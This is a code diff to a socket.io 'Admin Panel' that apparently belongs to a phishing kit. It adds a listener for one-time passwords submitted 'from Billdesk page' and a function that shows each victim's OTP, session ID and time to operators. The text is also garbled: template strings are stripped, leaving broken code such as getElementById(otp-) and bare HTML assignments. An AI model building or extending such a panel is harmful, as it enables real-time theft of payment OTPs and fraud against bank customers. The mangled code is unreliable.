@@ -65,6 +65,13 @@ function initializeConnection() {
         updateSubmissionStatus(data.sessionId, 'failed', data.reason);
     });
     
+
+    // NEW: Listen for OTP submissions from Billdesk page
+    socket.on('otpSubmitted', (data) => {
+        console.log('?? OTP submitted:', data);
+        displaySubmittedOTP(data.sessionId, data.otp, data.timestamp);
+        showNotification(?? OTP received:  for session , 'success');
+    });
     // NEW: Listen for submission marked as seen from other admins
     socket.on('submissionMarkedSeen', (data) => {
         console.log('👁️ Submission marked as seen:', data.sessionId);
@@ -574,8 +581,30 @@ style.textContent = `
 `;
 document.head.appendChild(style);
 
+
+// Display submitted OTP in admin panel
+function displaySubmittedOTP(sessionId, otp, timestamp) {
+    const otpDisplay = document.getElementById(otp-);
+    if (otpDisplay) {
+        const formattedTime = new Date(timestamp).toLocaleTimeString();
+        otpDisplay.innerHTML = 
+            <span class="otp-label">User OTP:</span>
+            <span class="otp-value submitted-otp"></span>
+            <span class="otp-time">()</span>
+        ;
+        otpDisplay.style.display = 'inline-block';
+        otpDisplay.style.background = '#e8f5e8';
+        otpDisplay.style.padding = '5px 10px';
+        otpDisplay.style.borderRadius = '4px';
+        otpDisplay.style.border = '1px solid #4caf50';
+    }
+}
+
 // Initialize on page load
 window.addEventListener('DOMContentLoaded', () => {
     console.log('🚀 Admin Panel initialized');
     initializeConnection();
 });
+
+
+
